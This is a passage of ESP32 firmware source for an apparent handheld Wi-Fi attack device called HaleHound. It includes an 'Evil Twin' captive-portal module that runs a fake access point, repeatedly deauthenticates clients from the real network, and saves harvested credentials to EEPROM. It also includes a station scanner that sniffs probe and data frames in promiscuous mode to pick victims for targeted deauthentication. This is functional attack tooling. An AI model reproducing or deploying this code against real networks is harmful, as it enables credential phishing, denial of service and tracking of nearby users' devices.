            waitForReleaseFlag = true;
            return;
        }
        // Credentials list at right edge
        if (tx >= (tft.width() - 35) && tx <= tft.width()) {
            credPage = 0;
            waitForReleaseFlag = true;
            drawCredList();
            return;
        }
    }

    // Button bar (y=290-314)
    int btnY = 290;
    if (ty >= btnY && ty <= btnY + 26) {
        // BACK button (5-75)
        if (tx >= 5 && tx <= 75) {
            exitRequested = true;
            waitForReleaseFlag = true;
            return;
        }
        // START/STOP button (85-155)
        if (tx >= 85 && tx <= 155) {
            if (portalActive) {
                stopPortal();
            } else {
                startPortal();
            }
            waitForReleaseFlag = true;
            return;
        }
        // CREDS button (165-235)
        if (tx >= 165 && tx <= 235) {
            credPage = 0;
            waitForReleaseFlag = true;
            drawCredList();
            return;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC API: setup, loop, cleanup, accessors
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    #if CYD_DEBUG
    Serial.println("[PORTAL] Initializing...");
    #endif

    // Always redraw screen on entry
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    exitRequested = false;
    waitForReleaseFlag = false;

    // Skip hardware init if already done
    if (initialized) {
        loadSSID();
        uint8_t savedTmpl = EEPROM.read(TMPL_ADDR);
        if (savedTmpl < TMPL_COUNT) currentTemplate = (PortalTemplate)savedTmpl;
        drawMainScreen();
        return;
    }

    EEPROM.begin(EEPROM_SIZE);

    int count = EEPROM.read(COUNT_ADDR);
    if (count > MAX_CREDS) {
        EEPROM.write(COUNT_ADDR, 0);
        EEPROM.commit();
    }

    loadSSID();

    // Load saved template
    uint8_t savedTmpl = EEPROM.read(TMPL_ADDR);
    if (savedTmpl < TMPL_COUNT) {
        currentTemplate = (PortalTemplate)savedTmpl;
    } else {
        currentTemplate = TMPL_WIFI;
    }

    // Reset terminal
    lineCount = 0;
    for (int i = 0; i < TERM_MAX_LINES; i++) {
        terminalBuffer[i] = "";
        colorBuffer[i] = HALEHOUND_MAGENTA;
    }

    totalClients = 0;
    prevClientCount = 0;

    drawMainScreen();

    terminalPrint("[*] Evil Twin ready", HALEHOUND_MAGENTA);
    terminalPrint("[*] Template: " + String(portalTemplateNames[currentTemplate]), HALEHOUND_VIOLET);

    initialized = true;

    #if CYD_DEBUG
    Serial.println("[PORTAL] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    // Process portal requests when active
    if (portalActive) {
        dnsServer.processNextRequest();
        server.handleClient();

        // Background deauth — kick clients off real AP every 3 seconds
        if (bgDeauthActive && (millis() - lastBgDeauth >= CP_DEAUTH_INTERVAL)) {
            sendBgDeauth();
            lastBgDeauth = millis();
        }

        // Track new client connections
        int currentClients = WiFi.softAPgetStationNum();
        if (currentClients > prevClientCount) {
            int newClients = currentClients - prevClientCount;
            for (int i = 0; i < newClients; i++) {
                terminalPrint("[+] New device connected", HALEHOUND_MAGENTA);
            }
            totalClients += newClients;
            drawInfo();
            drawStats();
        } else if (currentClients < prevClientCount) {
            terminalPrint("[-] Device disconnected", HALEHOUND_GUNMETAL);
            drawInfo();
        }
        prevClientCount = currentClients;
    }

    // Check BOOT button (GPIO 0) for emergency exit
    if (digitalRead(0) == LOW) {
        delay(50);  // Debounce
        if (digitalRead(0) == LOW) {
            exitRequested = true;
            return;
        }
    }

    // Handle cursor blink in keyboard mode
    if (currentScreen == SCREEN_KEYBOARD) {
        unsigned long now = millis();
        if (now - lastCursorToggle >= 500) {
            cursorState = !cursorState;
            lastCursorToggle = now;
            drawInputField();
        }
    }

    // Handle touch input
    handleTouch();
}

bool isPortalActive() { return portalActive; }
void setSSID(const char* ssid) { saveSSID(ssid); }
const char* getSSID() { return customSSID; }

int getCredentialCount() {
    int count = EEPROM.read(COUNT_ADDR);
    return (count > MAX_CREDS) ? 0 : count;
}

Credential getCredential(int index) {
    Credential cred;
    memset(&cred, 0, sizeof(cred));
    if (index >= 0 && index < getCredentialCount()) {
        EEPROM.get(CRED_ADDR + (index * CRED_SIZE), cred);
    }
    return cred;
}

void deleteCredential(int index) {
    int count = getCredentialCount();
    if (index < 0 || index >= count) return;

    for (int i = index; i < count - 1; i++) {
        Credential cred;
        EEPROM.get(CRED_ADDR + ((i + 1) * CRED_SIZE), cred);
        EEPROM.put(CRED_ADDR + (i * CRED_SIZE), cred);
    }

    count--;
    EEPROM.write(COUNT_ADDR, count);
    EEPROM.commit();
}

void clearAllCredentials() {
    EEPROM.write(COUNT_ADDR, 0);
    EEPROM.commit();
    terminalPrint("[*] All credentials cleared", HALEHOUND_HOTPINK);
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    stopPortal();
    initialized = false;
    exitRequested = false;
    waitForReleaseFlag = false;
    lineCount = 0;
    bgDeauthActive = false;
    hasTarget = false;
    memset(targetBSSID, 0, sizeof(targetBSSID));

    #if CYD_DEBUG
    Serial.println("[PORTAL] Cleanup complete");
    #endif
}

}  // namespace CaptivePortal


// ═══════════════════════════════════════════════════════════════════════════
// STATION SCANNER IMPLEMENTATION
// Discovers WiFi clients/stations via Probe Request sniffing
// HaleHound station discovery implementation
// ═══════════════════════════════════════════════════════════════════════════

namespace StationScan {

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════

#define MAX_STATIONS 50
#define MAX_VISIBLE 10
#define ITEM_HEIGHT 22
#define STATION_TIMEOUT 60000   // 60s stale timeout
#define CHANNEL_HOP_MS 300      // 300ms per channel
#define MAX_CHANNEL 13

// Forward declarations
static void drawFullUI();
static void drawHeader();

// ═══════════════════════════════════════════════════════════════════════════
// DATA STRUCTURES
// ═══════════════════════════════════════════════════════════════════════════

struct Station {
    uint8_t mac[6];           // Full MAC address
    int8_t rssi;              // Signal strength
    char vendor[8];           // OUI vendor prefix
    uint32_t lastSeen;        // millis() timestamp
    uint16_t frameCount;      // Activity indicator
    bool selected;            // For deauth targeting
    // AP association info (from Data frame sniffing)
    uint8_t apBssid[6];       // Associated AP BSSID
    uint8_t apChannel;        // Channel AP is on
    bool associated;          // True if we've seen this client in Data frames
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static Station stations[MAX_STATIONS];
static int stationCount = 0;
static int currentIndex = 0;      // Selected row for highlight
static int listStartIndex = 0;    // Pagination offset

static bool scanning = false;
static bool initialized = false;
static bool exitRequested = false;

static int currentChannel = 1;
static uint32_t lastChannelHop = 0;

// Deauth handoff state
static bool deauthRequested = false;
static uint8_t selectedMACs[MAX_STATIONS][6];
static uint8_t selectedAPMACs[MAX_STATIONS][6];  // AP BSSID for each selected client
static uint8_t selectedChannels[MAX_STATIONS];   // Channel for each selected client
static int selectedCount = 0;

// Thread-safe capture queue (handles both Probe and Data frames)
static volatile bool newStationReady = false;
static uint8_t pendingMAC[6];
static int8_t pendingRSSI = 0;
static uint8_t pendingAPMAC[6];      // AP BSSID from Data frame
static uint8_t pendingAPChannel = 0;  // Channel from Data frame
static volatile bool pendingHasAP = false;  // True if this is from Data frame

// ═══════════════════════════════════════════════════════════════════════════
// OUI VENDOR LOOKUP (Top manufacturers - PROGMEM optimized)
// ═══════════════════════════════════════════════════════════════════════════

static const char* lookupVendor(uint8_t* mac) {
    // Check for randomized MAC first (locally administered bit set)
    // Modern iOS/Android use random MACs when probing
    if (mac[0] & 0x02) return "Random";

    // Apple
    if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0xB3) return "Apple";
    if (mac[0] == 0xF0 && mac[1] == 0x18 && mac[2] == 0x98) return "Apple";
    if (mac[0] == 0x3C && mac[1] == 0x06 && mac[2] == 0x30) return "Apple";
    if (mac[0] == 0xA4 && mac[1] == 0x83 && mac[2] == 0xE7) return "Apple";
    if (mac[0] == 0x14 && mac[1] == 0x98 && mac[2] == 0x77) return "Apple";
    if (mac[0] == 0x80 && mac[1] == 0xE6 && mac[2] == 0x50) return "Apple";
    // Samsung
    if (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0x37) return "Samsung";
    if (mac[0] == 0xE4 && mac[1] == 0x7C && mac[2] == 0xF9) return "Samsung";
    if (mac[0] == 0x94 && mac[1] == 0x35 && mac[2] == 0x0A) return "Samsung";
    if (mac[0] == 0x8C && mac[1] == 0x71 && mac[2] == 0xF8) return "Samsung";
    // Google/Pixel
    if (mac[0] == 0x94 && mac[1] == 0xEB && mac[2] == 0x2C) return "Google";
    if (mac[0] == 0x3C && mac[1] == 0x28 && mac[2] == 0x6D) return "Google";
    if (mac[0] == 0xF4 && mac[1] == 0xF5 && mac[2] == 0xE8) return "Google";
    // Intel
    if (mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x64) return "Intel";
    if (mac[0] == 0x8C && mac[1] == 0x8D && mac[2] == 0x28) return "Intel";
    if (mac[0] == 0x48 && mac[1] == 0x51 && mac[2] == 0xB7) return "Intel";
    // Espressif (ESP32/ESP8266)
    if (mac[0] == 0x24 && mac[1] == 0x6F && mac[2] == 0x28) return "Esprsf";
    if (mac[0] == 0xA4 && mac[1] == 0xCF && mac[2] == 0x12) return "Esprsf";
    if (mac[0] == 0x30 && mac[1] == 0xAE && mac[2] == 0xA4) return "Esprsf";
    if (mac[0] == 0xAC && mac[1] == 0x67 && mac[2] == 0xB2) return "Esprsf";
    if (mac[0] == 0xA4 && mac[1] == 0xE5 && mac[2] == 0x7C) return "Esprsf";
    // Raspberry Pi
    if (mac[0] == 0xB8 && mac[1] == 0x27 && mac[2] == 0xEB) return "RasPi";
    if (mac[0] == 0xDC && mac[1] == 0xA6 && mac[2] == 0x32) return "RasPi";
    if (mac[0] == 0xE4 && mac[1] == 0x5F && mac[2] == 0x01) return "RasPi";
    // Amazon
    if (mac[0] == 0x74 && mac[1] == 0xC2 && mac[2] == 0x46) return "Amazon";
    if (mac[0] == 0xF0 && mac[1] == 0x27 && mac[2] == 0x2D) return "Amazon";
    if (mac[0] == 0x44 && mac[1] == 0x65 && mac[2] == 0x0D) return "Amazon";
    // Huawei
    if (mac[0] == 0x48 && mac[1] == 0x46 && mac[2] == 0xFB) return "Huawei";
    if (mac[0] == 0x00 && mac[1] == 0x9A && mac[2] == 0xCD) return "Huawei";
    // OnePlus
    if (mac[0] == 0x94 && mac[1] == 0x65 && mac[2] == 0x2D) return "OnePlus";
    if (mac[0] == 0xC0 && mac[1] == 0xEE && mac[2] == 0xFB) return "OnePlus";
    // Xiaomi
    if (mac[0] == 0x64 && mac[1] == 0xCC && mac[2] == 0x2E) return "Xiaomi";
    if (mac[0] == 0x78 && mac[1] == 0x02 && mac[2] == 0xF8) return "Xiaomi";
    // TP-Link
    if (mac[0] == 0x50 && mac[1] == 0xC7 && mac[2] == 0xBF) return "TP-Link";
    if (mac[0] == 0xEC && mac[1] == 0x08 && mac[2] == 0x6B) return "TP-Link";
    // Realtek (many wifi adapters)
    if (mac[0] == 0x00 && mac[1] == 0xE0 && mac[2] == 0x4C) return "Realtek";
    if (mac[0] == 0x48 && mac[1] == 0x5D && mac[2] == 0x60) return "Realtek";
    // Microsoft (Surface, Xbox)
    if (mac[0] == 0x28 && mac[1] == 0x18 && mac[2] == 0x78) return "Msft";
    if (mac[0] == 0x7C && mac[1] == 0x1E && mac[2] == 0x52) return "Msft";
    // Sony (PlayStation)
    if (mac[0] == 0x00 && mac[1] == 0x04 && mac[2] == 0x1F) return "Sony";
    if (mac[0] == 0xFC && mac[1] == 0x0F && mac[2] == 0xE6) return "Sony";
    // Default - unknown real MAC
    return "???";
}

// ═══════════════════════════════════════════════════════════════════════════
// STATION TRACKING
// ═══════════════════════════════════════════════════════════════════════════

static int findStation(uint8_t* mac) {
    for (int i = 0; i < stationCount; i++) {
        if (memcmp(stations[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

static void addOrUpdateStation(uint8_t* mac, int8_t rssi, uint8_t* apMac, uint8_t apChan, bool hasAP) {
    int idx = findStation(mac);

    if (idx >= 0) {
        // Update existing station
        stations[idx].rssi = rssi;
        stations[idx].lastSeen = millis();
        stations[idx].frameCount++;
        // Update AP info if we have it (Data frame)
        if (hasAP) {
            memcpy(stations[idx].apBssid, apMac, 6);
            stations[idx].apChannel = apChan;
            stations[idx].associated = true;
        }
    } else if (stationCount < MAX_STATIONS) {
        // Add new station
        memcpy(stations[stationCount].mac, mac, 6);
        stations[stationCount].rssi = rssi;
        strncpy(stations[stationCount].vendor, lookupVendor(mac), 7);
        stations[stationCount].vendor[7] = '\0';
        stations[stationCount].lastSeen = millis();
        stations[stationCount].frameCount = 1;
        stations[stationCount].selected = false;
        // Initialize AP info
        if (hasAP) {
            memcpy(stations[stationCount].apBssid, apMac, 6);
            stations[stationCount].apChannel = apChan;
            stations[stationCount].associated = true;
        } else {
            memset(stations[stationCount].apBssid, 0, 6);
            stations[stationCount].apChannel = 0;
            stations[stationCount].associated = false;
        }
        stationCount++;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PROMISCUOUS MODE CALLBACK
// ═══════════════════════════════════════════════════════════════════════════

static void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!scanning) return;
    if (newStationReady) return;  // Queue full, skip

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t frameControl = payload[0];
    uint8_t frameType = frameControl & 0x0C;      // Type field (bits 2-3)
    uint8_t frameSubtype = frameControl >> 4;     // Subtype field (bits 4-7)

    // ═══════════════════════════════════════════════════════════════════════
    // MANAGEMENT FRAMES - Probe Requests (client searching)
    // ═══════════════════════════════════════════════════════════════════════
    if (type == WIFI_PKT_MGMT && frameType == 0x00 && frameSubtype == 0x04) {
        // Probe Request: Source MAC at offset 10, no AP info
        uint8_t* srcMac = payload + 10;

        // Skip broadcast/multicast MACs
        if (srcMac[0] & 0x01) return;

        memcpy(pendingMAC, srcMac, 6);
        pendingRSSI = rssi;
        pendingHasAP = false;
        newStationReady = true;
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // DATA FRAMES - Client talking to AP (has BSSID!)
    // ═══════════════════════════════════════════════════════════════════════
    if (type == WIFI_PKT_DATA && frameType == 0x08) {
        // Check ToDS/FromDS bits in Frame Control byte 1
        uint8_t flags = payload[1];
        bool toDS = flags & 0x01;
        bool fromDS = flags & 0x02;

        uint8_t* clientMac = NULL;
        uint8_t* bssid = NULL;

        if (toDS && !fromDS) {
            // Client -> AP: BSSID at offset 4, Source (client) at offset 10
            bssid = payload + 4;
            clientMac = payload + 10;
        } else if (!toDS && fromDS) {
            // AP -> Client: Destination (client) at offset 4, BSSID at offset 10
            clientMac = payload + 4;
            bssid = payload + 10;
        } else {
            // WDS or IBSS - skip
            return;
        }

        // Skip broadcast/multicast client MACs
        if (clientMac[0] & 0x01) return;

        memcpy(pendingMAC, clientMac, 6);
        memcpy(pendingAPMAC, bssid, 6);
        pendingAPChannel = pkt->rx_ctrl.channel;
        pendingRSSI = rssi;
        pendingHasAP = true;
        newStationReady = true;
        return;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// CHANNEL HOPPING
// ═══════════════════════════════════════════════════════════════════════════

static void channelHopIfNeeded() {
    if (millis() - lastChannelHop >= CHANNEL_HOP_MS) {
        currentChannel = (currentChannel % MAX_CHANNEL) + 1;
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        lastChannelHop = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    // Icon bar background - HALEHOUND DARK
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);

    // Back icon at x=10
    tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);

    // Title and count
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setCursor(35, 24);
    tft.print("STATIONS (");
    tft.print(stationCount);
    tft.print(")");

    // Channel indicator
    tft.setCursor(150, 24);
    tft.print("CH:");
    tft.print(currentChannel);

    // Scan indicator (power icon)
    uint16_t pwrColor = scanning ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
    tft.drawBitmap(220, 20, bitmap_icon_led, 16, 16, pwrColor);

    // Separator
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

// Glitch title
static void drawHeader() {
    drawGlitchText(55, "STATIONS", &Nosifer_Regular10pt7b);
}

static void drawHeaders() {
    tft.fillRect(0, 60, SCREEN_WIDTH, 14, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setCursor(5, 62);
    tft.print("SEL");
    tft.setCursor(30, 62);
    tft.print("CLIENT");
    tft.setCursor(90, 62);
    tft.print("dB");
    tft.setCursor(115, 62);
    tft.print("AP/VENDOR");
}

static void drawStationList() {
    // Clear list area
    tft.fillRect(0, 74, SCREEN_WIDTH, 206, HALEHOUND_BLACK);

    if (stationCount == 0) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(40, 140);
        tft.print("Scanning for stations...");
        return;
    }

    uint32_t now = millis();
    int y = 74;
    int endIdx = min(listStartIndex + MAX_VISIBLE, stationCount);

    for (int i = listStartIndex; i < endIdx && y < 275; i++) {
        Station* s = &stations[i];
        uint32_t age = now - s->lastSeen;

        // Color based on state
        uint16_t rowColor;
        if (s->selected) {
            rowColor = HALEHOUND_HOTPINK;
        } else if (s->associated) {
            rowColor = HALEHOUND_BRIGHT;  // Has AP - most useful!
        } else if (age < 5000) {
            rowColor = HALEHOUND_MAGENTA;    // Recently active probe
        } else if (age > 30000) {
            rowColor = HALEHOUND_GUNMETAL;  // Stale
        } else {
            rowColor = HALEHOUND_MAGENTA;
        }

        // Highlight current selection row
        if (i == currentIndex) {
            tft.fillRect(0, y, SCREEN_WIDTH, ITEM_HEIGHT - 2, HALEHOUND_DARK);
        }

        tft.setTextColor(rowColor);
        tft.setTextSize(1);

        // Selection checkbox
        tft.setCursor(5, y + 4);
        tft.print(s->selected ? "[*]" : "[ ]");

        // Client MAC (shortened XX:XX:XX)
        char macStr[10];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X",
                 s->mac[3], s->mac[4], s->mac[5]);
        tft.setCursor(30, y + 4);
        tft.print(macStr);

        // RSSI
        tft.setCursor(90, y + 4);
        tft.print(s->rssi);

        // AP BSSID or Vendor
        tft.setCursor(115, y + 4);
        if (s->associated) {
            // Show AP BSSID (last 3 octets) + channel
            char apStr[12];
            snprintf(apStr, sizeof(apStr), "%02X:%02X:%02X",
                     s->apBssid[3], s->apBssid[4], s->apBssid[5]);
            tft.print(apStr);
        } else {
            // Show vendor (probe only)
            tft.print(s->vendor);
        }

        y += ITEM_HEIGHT;
    }
}

// Show info popup for a station
static void showStationInfo(int idx) {
    if (idx < 0 || idx >= stationCount) return;
    Station* s = &stations[idx];

    // Draw popup overlay
    tft.fillRect(10, 60, 220, 180, HALEHOUND_DARK);
    tft.drawRect(10, 60, 220, 180, HALEHOUND_HOTPINK);

    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setCursor(20, 70);
    tft.print("== STATION INFO ==");

    tft.setTextColor(HALEHOUND_MAGENTA);

    // Full MAC
    tft.setCursor(20, 90);
    tft.print("MAC: ");
    char macStr[20];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             s->mac[0], s->mac[1], s->mac[2], s->mac[3], s->mac[4], s->mac[5]);
    tft.print(macStr);

    // Vendor
    tft.setCursor(20, 105);
    tft.print("Vendor: ");
    tft.print(s->vendor);

    // RSSI
    tft.setCursor(20, 120);
    tft.print("RSSI: ");
    tft.print(s->rssi);
    tft.print(" dBm");

    // Frame count
    tft.setCursor(20, 135);
    tft.print("Frames: ");
    tft.print(s->frameCount);

    // Association status
    tft.setCursor(20, 155);
    if (s->associated) {
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.print("AP: ");
        char apStr[20];
        snprintf(apStr, sizeof(apStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s->apBssid[0], s->apBssid[1], s->apBssid[2],
                 s->apBssid[3], s->apBssid[4], s->apBssid[5]);
        tft.print(apStr);
        tft.setCursor(20, 170);
        tft.print("Channel: ");
        tft.print(s->apChannel);
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("Not associated (probe only)");
        tft.setCursor(20, 170);
        tft.print("Cannot target for deauth");
    }

    // Last seen
    uint32_t age = (millis() - s->lastSeen) / 1000;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(20, 190);
    tft.print("Last seen: ");
    tft.print(age);
    tft.print("s ago");

    // Close button
    tft.fillRect(85, 215, 70, 20, HALEHOUND_DARK);
    tft.drawRect(85, 215, 70, 20, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(103, 220);
    tft.print("CLOSE");

    // Wait for tap on close or anywhere
    delay(100);
    while (true) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            delay(150);  // Debounce
            break;
        }
        delay(20);
    }

    // Redraw full UI
    drawFullUI();
}

static void drawButtonBar() {
    // Calculate selection stats
    int selCount = 0;
    int selAssociated = 0;
    for (int i = 0; i < stationCount; i++) {
        if (stations[i].selected) {
            selCount++;
            if (stations[i].associated) selAssociated++;
        }
    }

    // Selection status line (y=272-280)
    tft.fillRect(0, 272, SCREEN_WIDTH, 10, HALEHOUND_BLACK);
    tft.setTextSize(1);
    if (selCount > 0) {
        tft.setCursor(5, 273);
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.print("Sel:");
        tft.print(selCount);
        if (selAssociated > 0) {
            tft.setTextColor(HALEHOUND_BRIGHT);
            tft.print(" (");
            tft.print(selAssociated);
            tft.print(" w/AP)");
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print(" (no AP link)");
        }
    } else if (stationCount > 0) {
        tft.setCursor(5, 273);
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("Tap rows to select targets");
    }

    // Button bar (y=283-318)
    tft.fillRect(0, 283, SCREEN_WIDTH, 37, HALEHOUND_GUNMETAL);

    // Calculate pagination
    int totalPages = (stationCount + MAX_VISIBLE - 1) / MAX_VISIBLE;
    if (totalPages < 1) totalPages = 1;
    int currentPage = listStartIndex / MAX_VISIBLE + 1;
    bool canPrev = listStartIndex > 0;
    bool canNext = listStartIndex + MAX_VISIBLE < stationCount;

    // BACK button (x=5-42)
    tft.fillRect(5, 288, 37, 25, HALEHOUND_DARK);
    tft.drawRect(5, 288, 37, 25, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(8, 296);
    tft.print("BACK");

    // INFO button (x=47-82) - shows details of current station
    uint16_t infoColor = (currentIndex >= 0 && currentIndex < stationCount) ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(47, 288, 35, 25, HALEHOUND_DARK);
    tft.drawRect(47, 288, 35, 25, infoColor);
    tft.setTextColor(infoColor);
    tft.setCursor(52, 296);
    tft.print("INFO");

    // PREV button (x=87-112)
    uint16_t prevColor = canPrev ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(87, 288, 25, 25, HALEHOUND_DARK);
    tft.drawRect(87, 288, 25, 25, prevColor);
    tft.setTextColor(prevColor);
    tft.setCursor(95, 296);
    tft.print("<");

    // Page indicator (x=117-157)
    tft.fillRect(117, 288, 40, 25, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(122, 296);
    tft.print(currentPage);
    tft.print("/");
    tft.print(totalPages);

    // NEXT button (x=162-187)
    uint16_t nextColor = canNext ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(162, 288, 25, 25, HALEHOUND_DARK);
    tft.drawRect(162, 288, 25, 25, nextColor);
    tft.setTextColor(nextColor);
    tft.setCursor(170, 296);
    tft.print(">");

    // ATK button (x=192-235) - only active if associated stations selected
    uint16_t atkColor = (selCount > 0 && selAssociated > 0) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
    tft.fillRect(192, 288, 43, 25, HALEHOUND_DARK);
    tft.drawRect(192, 288, 43, 25, atkColor);
    tft.setTextColor(atkColor);
    tft.setCursor(202, 296);
    tft.print("ATK");
}

static void drawFullUI() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();
    drawHeader();
    drawHeaders();
    drawStationList();
    drawButtonBar();
}

// ═══════════════════════════════════════════════════════════════════════════
// TOUCH HANDLING
// ═══════════════════════════════════════════════════════════════════════════

static void handleTouch() {
    static unsigned long lastTouch = 0;
    if (millis() - lastTouch < 150) return;

    uint16_t tx, ty;
    if (!getTouchPoint(&tx, &ty)) return;

    lastTouch = millis();

    // Icon bar (y=20-36)
    if (ty >= 20 && ty <= 36) {
        // Back icon at x=10-26
        if (tx >= 10 && tx <= 26) {
            exitRequested = true;
            return;
        }
        // Power toggle at x=220-236
        if (tx >= 220 && tx <= 236) {
            if (scanning) {
                stopScanning();
            } else {
                startScanning();
            }
            drawIconBar();
            return;
        }
    }

    // Station list area (y=74-275)
    if (ty >= 74 && ty <= 275 && stationCount > 0) {
        int tappedRow = (ty - 74) / ITEM_HEIGHT;
        int tappedIdx = listStartIndex + tappedRow;

        if (tappedIdx >= 0 && tappedIdx < stationCount) {
            // Toggle selection
            stations[tappedIdx].selected = !stations[tappedIdx].selected;
            currentIndex = tappedIdx;
            drawStationList();
            drawButtonBar();
        }
        return;
    }

    // Button bar (y=283-320)
    if (ty >= 283) {
        // BACK button (x=5-42)
        if (tx >= 5 && tx <= 42) {
            exitRequested = true;
            return;
        }
        // INFO button (x=47-82)
        if (tx >= 47 && tx <= 82) {
            if (currentIndex >= 0 && currentIndex < stationCount) {
                showStationInfo(currentIndex);
            }
            return;
        }
        // PREV button (x=87-112)
        if (tx >= 87 && tx <= 112) {
            if (listStartIndex > 0) {
                listStartIndex -= MAX_VISIBLE;
                if (listStartIndex < 0) listStartIndex = 0;
                drawStationList();
                drawButtonBar();
            }
            return;
        }
        // NEXT button (x=162-187)
        if (tx >= 162 && tx <= 187) {
            if (listStartIndex + MAX_VISIBLE < stationCount) {
                listStartIndex += MAX_VISIBLE;
                drawStationList();
                drawButtonBar();
            }
            return;
        }
        // ATK button (x=192-235)
        if (tx >= 192 && tx <= 235) {
            // Build selected MACs + AP info for targeted deauth
            selectedCount = 0;
            for (int i = 0; i < stationCount && selectedCount < MAX_STATIONS; i++) {
                if (stations[i].selected && stations[i].associated) {
                    memcpy(selectedMACs[selectedCount], stations[i].mac, 6);
                    memcpy(selectedAPMACs[selectedCount], stations[i].apBssid, 6);
                    selectedChannels[selectedCount] = stations[i].apChannel;
                    selectedCount++;
                }
            }
            if (selectedCount > 0) {
                deauthRequested = true;
                exitRequested = true;
            }
            return;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC API
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    #if CYD_DEBUG
    Serial.println("[STATION] Initializing Station Scanner...");
    #endif

    // Reset state
    exitRequested = false;
    deauthRequested = false;
    stationCount = 0;
    currentIndex = 0;
    listStartIndex = 0;
    currentChannel = 1;
    lastChannelHop = millis();
    newStationReady = false;

    // Draw initial UI
    drawFullUI();

    if (!initialized) {
        // Initialize WiFi in promiscuous mode
        nvs_flash_init();
        tcpip_adapter_init();
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
        ESP_ERROR_CHECK(esp_wifi_start());

        initialized = true;
    }

    // Start scanning immediately
    startScanning();

    #if CYD_DEBUG
    Serial.println("[STATION] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    // Process pending station from ISR
    if (newStationReady) {
        addOrUpdateStation(pendingMAC, pendingRSSI, pendingAPMAC, pendingAPChannel, pendingHasAP);
        newStationReady = false;
        pendingHasAP = false;

        // Update display periodically (not every packet)
        static uint32_t lastListUpdate = 0;
        if (millis() - lastListUpdate > 500) {
            drawStationList();
            drawButtonBar();
            drawIconBar();
            lastListUpdate = millis();
        }
    }

    // Channel hopping
    if (scanning) {
        channelHopIfNeeded();
    }

    // Touch handling
    touchButtonsUpdate();
    handleTouch();

    // Hardware back button
    if (isBackButtonTapped()) {
        exitRequested = true;
    }

    // Status bar update
    static uint32_t lastStatusUpdate = 0;
    if (millis() - lastStatusUpdate > 1000) {
        drawStatusBar();
        lastStatusUpdate = millis();
    }
}

void startScanning() {
    if (scanning) return;

    // Set promiscuous filter to capture MGMT and DATA frames
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
    esp_wifi_set_promiscuous(true);
    scanning = true;
    lastChannelHop = millis();

    #if CYD_DEBUG
    Serial.println("[STATION] Scanning started (MGMT+DATA)");
    #endif
}

void stopScanning() {
    if (!scanning) return;

    esp_wifi_set_promiscuous(false);
    scanning = false;

    #if CYD_DEBUG
    Serial.println("[STATION] Scanning stopped");
    #endif
}

bool isScanning() {
